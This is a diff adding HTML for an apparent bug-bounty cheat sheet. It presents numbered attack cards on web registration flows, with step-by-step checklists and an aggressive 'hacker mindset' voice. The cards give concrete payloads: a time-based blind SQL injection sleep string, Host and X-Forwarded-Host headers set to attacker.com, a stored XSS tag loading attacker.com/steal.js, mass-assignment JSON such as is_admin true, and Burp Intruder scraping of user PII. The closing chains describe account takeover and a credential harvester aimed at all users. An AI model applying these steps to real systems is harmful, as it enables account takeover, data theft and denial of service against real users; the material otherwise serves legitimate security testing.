+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">INPUT VALIDATION</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Create multiple accounts or bypass invite limits using case/alias variations of the same email.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Register <code>Victim@gmail.com</code> → then try <code>victim@gmail.com</code> (case test)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Test Gmail aliases: <code>victim+1@gmail.com</code>, <code>v.ictim@gmail.com</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Test restricted domain bypass: <code>attacker@company.com.evil.com</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check if server treats these as UNIQUE users but sends to same inbox</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If yes: bypass invite limits, spam controls, or uniqueness constraints</div></li>
+      </ul>
+      <div class="mindset"><p>"Computers see 'A' and 'a' differently, but humans don't. Exploiting this gap is the easiest way to break uniqueness constraints."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards-grid phase2 -->
+
+
+<!-- ═══════════════════════════════════════════════════
+     PHASE 3: IDENTITY & ACCESS MANIPULATION
+═══════════════════════════════════════════════════ -->
+<div class="phase-header" style="--phase-color:#ff3355; margin-top:60px">
+  <div class="phase-badge" style="background:#ff3355">PHASE 03</div>
+  <div class="phase-title">IDENTITY & ACCESS MANIPULATION — The Takeover Zone</div>
+  <div class="phase-goal">IDOR · BAC · Privilege Escalation · Account Deletion</div>
+</div>
+<div class="cards-grid">
+
+  <!-- REPORT 11 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#11</div>
+      <div class="card-title-block">
+        <div class="card-title">Mars/Royal Canin — IDOR in Profile/Registration Update</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">A01: BROKEN ACCESS</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Modify email or personal details of ANY registered user by tampering with the user_id parameter.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Login to account → go to profile update/registration completion page</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Capture POST request → look for <code>id=123</code>, <code>user_id=88796</code>, or <code>uuid=ABC</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Change YOUR ID to Victim's ID (found during Phase 1 Enumeration)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Change email field to attacker's email address</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If "Profile Updated Successfully" → try login with victim email + your password</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Alt: trigger password reset on victim's (now attacker-controlled) email → FULL ATO</div></li>
+      </ul>
+      <div class="mindset"><p>"Never trust a User ID sent from the client. If the server doesn't verify if 'Session A' actually owns 'User ID 123', the entire database is public property."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 12 -->
+  <div class="card" style="--card-color:#ff7733">
+    <div class="card-header">
+      <div class="report-num">#12</div>
+      <div class="card-title-block">
+        <div class="card-title">Email Collision — Account Permanent Deletion</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ff7733;border-color:#ff7733;background:rgba(255,119,51,0.08)">BUSINESS LOGIC</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Delete a victim's account by overwriting their email record in DB during attacker's profile update.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Register Attacker account → identify Victim's email on platform</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">In attacker settings: change your email TO victim's email address</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check: does server throw "Email already exists"? If NOT → potential collision</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Change attacker email back to original</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Try to register victim's email again → if "Available" → victim account DELETED from DB</div></li>
+      </ul>
+      <div class="mindset"><p>"A database is just a list. If I can force my data into someone else's slot, I can erase their digital existence."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 13 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#13</div>
+      <div class="card-title-block">
+        <div class="card-title">Dropbox — Privilege Escalation via Hidden Signup Fields</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">BROKEN ACCESS</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Register as Admin/Staff by injecting hidden privilege parameters during signup request.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Inspect signup form HTML for hidden inputs; examine JSON body in Burp</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Inject: <code>{"is_admin": true}</code>, <code>{"role": "admin"}</code>, <code>{"user_type": 1}</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Also try: <code>{"is_staff": true}</code>, <code>{"account_type": "premium"}</code>, <code>{"plan": "enterprise"}</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Complete registration with injected fields</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Verify: does dashboard show "Admin Settings" or "User Management" tabs? = CRITICAL</div></li>
+      </ul>
+      <div class="mindset"><p>"Developers often use the same API for public signup and internal admin creation. If they don't strip 'Admin' flags from public requests, you've just been promoted."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 14 -->
+  <div class="card" style="--card-color:#00aaff">
+    <div class="card-header">
+      <div class="report-num">#14</div>
+      <div class="card-title-block">
+        <div class="card-title">Mass PII Leak via Registration API (BOLA)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00aaff;border-color:#00aaff;background:rgba(0,170,255,0.08)">BOLA / IDOR</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Scrape PII of thousands of users by incrementing IDs in the Registration API endpoint.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Find API endpoint: <code>/api/v1/registration/view?id=100</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Remove session cookies → test unauthenticated access</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Use Burp Intruder → iterate <code>id</code> from 1 to 10,000</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Collect: full names, phone numbers, home addresses from JSON responses</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Document total records exposed → calculate max impact for report</div></li>
+      </ul>
+      <div class="mindset"><p>"APIs are often the weakest link. They are built for speed, often at the cost of authorization checks."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 15 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#15</div>
+      <div class="card-title-block">
+        <div class="card-title">OAuth Redirect — Registration Token Hijack</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08)">BROKEN LOGIC</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Steal OAuth tokens during "Sign up with Google/GitHub" by manipulating the redirect_uri parameter.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Analyze OAuth URL: <code>...redirect_uri=https://site.com/callback</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Try: <code>https://site.com.attacker.com</code> (subdomain confusion)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Try: <code>https://site.com/logout?redirect=https://attacker.com</code> (open redirect chain)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Try URL encoding: <code>%2F%2Fattacker.com</code> or null byte tricks</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If modified URI accepted: Authorization Code sent to attacker → login as victim</div></li>
+      </ul>
+      <div class="mindset"><p>"OAuth is a trust relationship. If I can redirect that trust to my own server, I can login as the user without ever knowing their password."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards-grid phase3 -->
+
+
+<!-- ═══════════════════════════════════════════════════
+     PHASE 4: INFRASTRUCTURE & CODE INJECTION
+═══════════════════════════════════════════════════ -->
+<div class="phase-header" style="--phase-color:#aa55ff; margin-top:60px">
+  <div class="phase-badge" style="background:#aa55ff">PHASE 04</div>
+  <div class="phase-title">INFRASTRUCTURE & CODE INJECTION — Attack the Core</div>
+  <div class="phase-goal">SQLi · Host Header · DoS · Crypto Failures</div>
+</div>
+<div class="cards-grid">
+
+  <!-- REPORT 16 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#16</div>
+      <div class="card-title-block">
+        <div class="card-title">Mozilla Social — Time-Based Blind SQLi in Registration</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">A03: INJECTION</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Extract entire database by injecting SQL commands into registration fields (Username, Invite Code, Org Name).</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Focus on DB-stored fields: Username, Invite Code, Organization Name, Referral Code</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Test delay payload: <code>Admin' AND (SELECT 1 FROM (SELECT(SLEEP(10)))A)--</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Monitor Burp's "Response Received" timer → 10+ second delay = SQLi CONFIRMED</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Use <code>sqlmap</code> or manual IF/CASE to extract DB names character by character</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Extract: users table, password hashes, config tables</div></li>
+      </ul>
+      <div class="mindset"><p>"The server might not show you an error, but its 'silence' (delay) tells you everything. If it sleeps when you tell it to, you own the database."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 17 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#17</div>
+      <div class="card-title-block">
+        <div class="card-title">DoD .mil — Host Header Injection (Email Poisoning)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">SERVER MISCONFIG</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Force server to send verification emails pointing to attacker-controlled domain by poisoning Host header.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Intercept Signup/Verification request in Burp Suite</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Modify: <code>Host: attacker.com</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If blocked, try: <code>X-Forwarded-Host: attacker.com</code>, <code>X-Host: attacker.com</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Also try: <code>X-Forwarded-Server</code>, <code>X-Original-URL</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Complete signup → check VPS logs for incoming token requests</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If verification link in victim's email points to attacker.com = CRITICAL RCE potential</div></li>
+      </ul>
+      <div class="mindset"><p>"Never trust the Host header. Many servers use it to build absolute URLs for emails. If I control the header, I control the destination of the secret link."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 18 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#18</div>
+      <div class="card-title-block">
+        <div class="card-title">Hacky Holidays — Scientific Notation Logic Bypass</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-medium">MEDIUM</span>
+          <span class="badge-cat" style="color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08)">INPUT VALIDATION</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Bypass age restrictions or numeric limits using mathematical notation processed differently by frontend vs backend.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Find numeric field with limits (age: 18-99, min deposit, max value)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Test scientific notation: <code>1e2</code> (=100), <code>0.18e2</code> (=18), <code>1e3</code> (=1000)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Test negative: <code>-1</code>, <code>0</code>, <code>null</code>, <code>undefined</code> in numeric fields</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If JS blocks 100 but PHP/NodeJS backend accepts 1e2 → validation bypassed</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Confirm: DB error or business rule bypass (minimum age, deposit limit) = VULN</div></li>
+      </ul>
+      <div class="mindset"><p>"Languages like PHP and JavaScript have 'quirks' in how they handle strings vs numbers. Exploiting these quirks is the hallmark of a senior hunter."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 19 -->
+  <div class="card" style="--card-color:#00aaff">
+    <div class="card-header">
+      <div class="report-num">#19</div>
+      <div class="card-title-block">
+        <div class="card-title">UPchieve — Resource Exhaustion DoS (Long Password)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-medium">MEDIUM</span>
+          <span class="badge-cat" style="color:#00aaff;border-color:#00aaff;background:rgba(0,170,255,0.08)">A05: DOS</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Crash server CPU by sending extremely long password requiring massive bcrypt/scrypt hashing power.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Create payload file with 1,000,000 characters (all 'A's)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Paste into password field during registration → capture in Burp → send</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Observe: does server take 30-60+ seconds? Returns <code>504 Gateway Timeout</code>?</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Send multiple concurrent requests to amplify DoS effect</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Document CPU/response time impact → calculate realistic DoS scenario</div></li>
+      </ul>
+      <div class="mindset"><p>"Security features like 'hashing' can be turned into weapons. If there's no character limit on the password field, I can make the server work itself to death."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 20 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#20</div>
+      <div class="card-title-block">
+        <div class="card-title">Slack — Weak Token Generation (Predictable Registration)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">CRYPTO FAILURE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Predict registration/verification tokens for any user without accessing their email.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Register 5-10 accounts rapidly → save ALL verification tokens</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Analyze pattern: time-based? (Base64 of timestamp), sequential? (101,102,103), user-based? (MD5 of username)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check token entropy with CyberChef or token analyzer</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Attempt prediction: guess token for victim email registered at known time</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If predicted correctly → verify victim account without their email access = ATO</div></li>
+      </ul>
+      <div class="mindset"><p>"Randomness is hard for computers. If the developer used a weak function like rand() instead of crypto.randomBytes(), the 'secret' is just a math problem waiting to be solved."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards-grid phase4 -->
+
+
+<!-- ═══════════════════════════════════════════════════
+     PHASE 5: ADVANCED CHAINING — THE MASTER PLAN
+═══════════════════════════════════════════════════ -->
+<div class="phase-header" style="--phase-color:#ff3355; margin-top:60px">
+  <div class="phase-badge" style="background:linear-gradient(135deg,#ff3355,#aa55ff)">PHASE 05</div>
+  <div class="phase-title">ADVANCED CHAINING — The Art of Destruction</div>
+  <div class="phase-goal">Logic + Injection + Chaining = Maximum Bounty</div>
+</div>
+<div class="cards-grid">
+
+  <!-- REPORT 21 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#21</div>
+      <div class="card-title-block">
+        <div class="card-title">Abritel.fr — Web Cache Poisoning via Registration Headers</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">CACHE POISON</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Serve malicious registration page or inject scripts to ALL users by poisoning the server's cache.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Add random header to signup request: <code>X-Forwarded-Host: attacker.com</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check response: does server reflect header in a JS path or link?</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">e.g. <code>&lt;script src="https://attacker.com/js/app.js"&gt;</code> in response = CRITICAL</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Send request multiple times → wait for CDN/Cloudflare/Varnish to cache the poisoned version</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Open incognito browser → visit signup page → confirm malicious JS loads for all users</div></li>
+      </ul>
+      <div class="mindset"><p>"Don't just attack the user; attack the server's memory. If you poison the cache, the server becomes your distribution tool for malware."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 22 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#22</div>
+      <div class="card-title-block">
+        <div class="card-title">Registration CSRF → Account Pre-Hijacking</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">CSRF</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Force victim to create an account with attacker-known credentials via CSRF on signup form.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check signup form: is there a unique <code>csrf_token</code>? If NO → vulnerable</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Craft HTML form that auto-submits signup with attacker-chosen email + password</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Host on attacker.com → send link to victim</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">When victim visits (while logged in to browser): account auto-created with known creds</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Attacker logs in before victim realizes → Pre-Hijack CONFIRMED</div></li>
+      </ul>
+      <div class="mindset"><p>"A user should always be the one to click 'Submit'. If I can click it for them using a hidden script, I control their first step into the application."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 23 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#23</div>
+      <div class="card-title-block">
+        <div class="card-title">Acronis — XSS + CSRF Chain (Admin Account Takeover)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">CHAIN ATTACK</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Gain admin access by planting stored XSS in registration form, executed when admin approves your account.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">In registration form, enter XSS in First Name / Organization: <code>&lt;script src="https://attacker.com/steal.js"&gt;&lt;/script&gt;</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Submit registration → wait for Admin to view "Pending Approvals" dashboard</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">When admin views your entry → payload executes in admin's browser session</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">XSS payload triggers CSRF: creates new Admin account or changes admin password</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Login with new admin credentials → Full admin takeover without knowing original password</div></li>
+      </ul>
+      <div class="mindset"><p>"The registration form is an input to an internal system. If the Admin panel doesn't sanitize your data, you are not just a user; you are the Admin's shadow."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 24 -->
+  <div class="card" style="--card-color:#00aaff">
+    <div class="card-header">
+      <div class="report-num">#24</div>
+      <div class="card-title-block">
+        <div class="card-title">LinkedIn — Race Condition in Invite-Only Registration</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00aaff;border-color:#00aaff;background:rgba(0,170,255,0.08)">TIMING ATTACK</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Use a single-use invite code multiple times by exploiting the gap between "check" and "update" operations.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Capture valid signup request with one-time invite code</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Set up Burp's Turbo Intruder with "single-packet attack" mode</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Send 50 signup requests with same invite code at exact same millisecond</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Observe: how many 200 OK responses? More than 1 = Race Condition CONFIRMED</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Document: attacker created N accounts from 1 invite code → business logic destroyed</div></li>
+      </ul>
+      <div class="mindset"><p>"Computers do things one by one very fast, but if you send them at the exact same time, you can slip through the gap between 'checking' and 'updating' the database."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 25 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#25</div>
+      <div class="card-title-block">
+        <div class="card-title">Final CTF — Chain Attack: Enumeration + SQLi + IDOR = ATO</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08)">THE MASTERPIECE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Combine Enumeration + SQLi + IDOR in a 3-bug chain to achieve full Account Takeover.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST — THE CHAIN</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Step 1 — Enum:</strong> Use timing/response diff to confirm victim email exists on platform</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Step 2 — SQLi:</strong> Inject sleep payload into invite/registration field → confirm DB injection point</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Step 3 — Extract:</strong> Use sqlmap to dump users table → get victim's user_id</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Step 4 — IDOR:</strong> Use victim's user_id in profile update request → change their email to attacker's</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Step 5 — ATO:</strong> Trigger password reset on attacker email → login as victim → Full Account Takeover</div></li>
+      </ul>
+      <div class="mindset"><p>"One bug is a discovery. Three bugs chained is a paycheck. Always ask: what does this vulnerability enable that makes the next attack possible?"</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards-grid phase5 -->
+
+
+<!-- ═══════════════════ CHAIN FORMULA ═══════════════════ -->
+<div class="chain-box">
+  <h2>⚡ THE CHAIN RULE — Maximum Bounty Formula</h2>
+  <div class="chain-formula">
+    <span class="part p1">ENUMERATION</span>
+    <span class="op">+</span>
+    <span class="part p2">LOGIC BYPASS</span>
+    <span class="op">+</span>
+    <span class="part p3">INJECTION</span>
+    <span class="op">=</span>
+    <span class="part p4">CRITICAL ATO</span>
+  </div>
+  <div class="chain-examples">
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #1: THE ESCALATION</div>
+      <p>XSS in registration form → Stored in Admin Panel → CSRF triggered → Admin account created → Privilege Escalation to Admin</p>
+    </div>
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #2: THE SILENT TAKEOVER</div>
+      <p>Referer token leak → Predict weak token → Pre-register victim email → OAuth merge → Maintain access after password reset</p>
+    </div>
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #3: THE DATABASE HEIST</div>
+      <p>SQLi in invite field → Dump user IDs → IDOR profile update → Change victim email → Password reset → Full ATO</p>
+    </div>
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #4: THE MASS BREACH</div>
+      <p>Cache poisoning via Host header → Malicious JS on signup page → Credential harvester for ALL registering users</p>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════ MASTER REFERENCE TABLE ═══════════════════ -->
+<div class="master-table-section">
+  <h2>📋 MASTER REFERENCE — All 30 Reports Quick View</h2>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th><th>TARGET / BUG</th><th>TECHNIQUE</th><th>SEVERITY</th><th>KEY TOOL</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td>01</td><td>Mattermost — OTP Bypass</td><td>Global OTP Token Swap</td><td style="color:#ff3355">CRITICAL</td><td>Burp Repeater</td></tr>
+        <tr><td>02</td><td>Acronis — Email Bypass</td><td>State Machine Jump</td><td style="color:#ff7733">HIGH</td><td>Burp + URL Navigate</td></tr>
+        <tr><td>03</td><td>DoD .mil — Host Header</td><td>X-Forwarded-Host Poison</td><td style="color:#ff7733">HIGH</td><td>Burp + VPS</td></tr>
+        <tr><td>04</td><td>Tucows — Pre-hijacking</td><td>Identity Collision</td><td style="color:#ff7733">HIGH</td><td>Manual</td></tr>
